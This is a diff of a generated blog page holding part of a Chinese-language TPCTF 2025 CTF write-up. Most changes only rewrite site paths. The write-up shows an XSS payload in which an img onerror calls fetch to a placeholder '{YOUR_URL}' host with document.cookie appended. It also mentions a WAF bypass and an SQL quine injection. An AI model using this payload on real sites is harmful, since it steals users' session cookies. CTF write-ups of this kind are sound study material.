 <p>成功跳转</p>
 <p>2.构造恶意xss</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">logout： a&lt;style&gt;&#123;&#123;content&#125;&#125;&lt;&#123;&#123;content&#125;&#125;&lt;/style&gt;<br><br>content： img src onerror=<span class="hljs-title function_">fetch</span>(<span class="hljs-string">`&#123;YOUR_URL&#125;/`</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>) &lt;style&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure>
 
 <p>来使用<code>fetch</code>也可以，都是利用非恶意标签<code>&lt;style&gt;</code>来构造<code>xss</code></p>
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312202007357.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250312202007357"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312202007357.png" srcset="/img/loading.gif" lazyload alt="image-20250312202007357"></p>
 <h2 id="Are-you-incognito"><a href="#Are-you-incognito" class="headerlink" title="Are you incognito?"></a>Are you incognito?</h2><p><a target="_blank" rel="noopener" href="https://ouuan.moe/post/2025/03/tpctf-2025#are-you-incognito-3-solves">解法1</a></p>
 <p>他们说是0day，我不到啊，0day拿来出题吗😭😅</p>
 <p>复现不明白可还行😅</p>
@@ -398,7 +398,7 @@
 <p>看大佬的博客知道是要利用<code>multipart/form-data</code>来bypass😅又一个知识盲点 <a target="_blank" rel="noopener" href="https://sym01.com/posts/2021/bypass-waf-via-boundary-confusion/">参考1</a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/throwable/p/15740444.html">参考2</a></p>
 <p>代码发现限制为 admin</p>
 <p>看到源码逻辑就是sql的<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253570">quine注入</a>😅怎么这么古老的又拿来考啊，关键是我还不会</p>
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250313000506076.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250313000506076"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250313000506076.png" srcset="/img/loading.gif" lazyload alt="image-20250313000506076"></p>
 <p>没有复现成功，环境有点问题</p>
 <h2 id="thumbor-1"><a href="#thumbor-1" class="headerlink" title="thumbor 1"></a>thumbor 1</h2><p>看不懂,有机会复现吧</p>
 <h2 id="thumbor-2"><a href="#thumbor-2" class="headerlink" title="thumbor 2"></a>thumbor 2</h2><p>难</p>
@@ -420,7 +420,7 @@
     
       <span class="category-chain">
         
-  <a href="/tuyi/categories/%E6%AF%94%E8%B5%9B/" class="category-chain-item">比赛</a>
+  <a href="/categories/%E6%AF%94%E8%B5%9B/" class="category-chain-item">比赛</a>
   
   
 
@@ -435,11 +435,11 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tuyi/tags/%E9%9A%BE%E5%BA%A6%E7%88%86%E5%A4%A7/" class="print-no-link">#难度爆大</a>
+        <a href="/tags/%E9%9A%BE%E5%BA%A6%E7%88%86%E5%A4%A7/" class="print-no-link">#难度爆大</a>
       
-        <a href="/tuyi/tags/xss/" class="print-no-link">#xss</a>
+        <a href="/tags/xss/" class="print-no-link">#xss</a>
       
-        <a href="/tuyi/tags/sql/" class="print-no-link">#sql</a>
+        <a href="/tags/sql/" class="print-no-link">#sql</a>
       
     </div>
   
@@ -452,7 +452,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>TPCTF复现</div>
-      <div>https://blog.tuyiisxp.top/2025/03/09/TPCTF复现/</div>
+      <div>https://258369123.github.io/2025/03/09/TPCTF复现/</div>
     </div>
     <div class="license-meta">
       
@@ -501,7 +501,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/tuyi/2025/03/09/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="原型链污染">
+                      <a href="/2025/03/09/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="原型链污染">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">原型链污染</span>
                         <span class="visible-mobile">上一篇</span>
@@ -511,7 +511,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/tuyi/2025/03/02/CNEXT%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" title="CNEXT漏洞研究">
+                      <a href="/2025/03/02/CNEXT%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" title="CNEXT漏洞研究">
                         <span class="hidden-mobile">CNEXT漏洞研究</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -702,8 +702,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/tuyi/js/events.js" ></script>
-<script  src="/tuyi/js/plugins.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -725,7 +725,7 @@
 
 
   
-    <script  src="/tuyi/js/img-lazyload.js" ></script>
+    <script  src="/js/img-lazyload.js" ></script>
   
 
 
@@ -824,7 +824,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/tuyi/js/local-search.js" ></script>
+  <script  src="/js/local-search.js" ></script>
 
   <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
@@ -834,13 +834,13 @@
   
 <script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
 <script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script>
-<script src="/tuyi/js/reward.js"></script>
+<script src="/js/reward.js"></script>
 
 
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/tuyi/js/boot.js" ></script>
+<script  src="/js/boot.js" ></script>
 
 
   
